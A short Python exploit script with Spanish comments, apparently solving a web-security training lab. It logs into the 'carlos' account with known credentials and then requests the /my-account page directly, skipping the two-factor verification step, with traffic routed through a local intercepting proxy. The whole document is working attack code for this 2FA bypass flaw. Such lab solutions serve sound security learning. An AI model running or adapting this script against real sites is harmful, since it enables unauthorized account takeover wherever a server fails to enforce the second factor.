import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}


def access_carlos_account(s,url):

    # Login en cuenta de carlos
    print("[+] Iniciar sesión en la cuenta de carlos y omitir verificación 2FA")
    login_url = f"{url}/login"
    loging_data = {"username":"carlos","password":"montoya"}
    r = s.post(login_url, data=loging_data, allow_redirects=False, verify=False, proxies=proxies)
    
    # Confirma bypass
    myaccount_url = f"{url}/my-account"
    r = s.get(myaccount_url, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("[+] Se omitio con éxito la verificación 2FA")
    else:
        print("[-] Exploit failed.")
        sys.exit(-1)
    

def main():
    if len(sys.argv) != 2:
        print(f"[+] Uso: {sys.argv[0]} <url>")
        print(f"[+] Ejemplo: {sys.argv[0]} www.ejemplo.com")
        sys.exit(-1)
    
    s = requests.session()
    url = sys.argv[1]
    access_carlos_account(s,url)

if __name__ == "__main__":
    main()

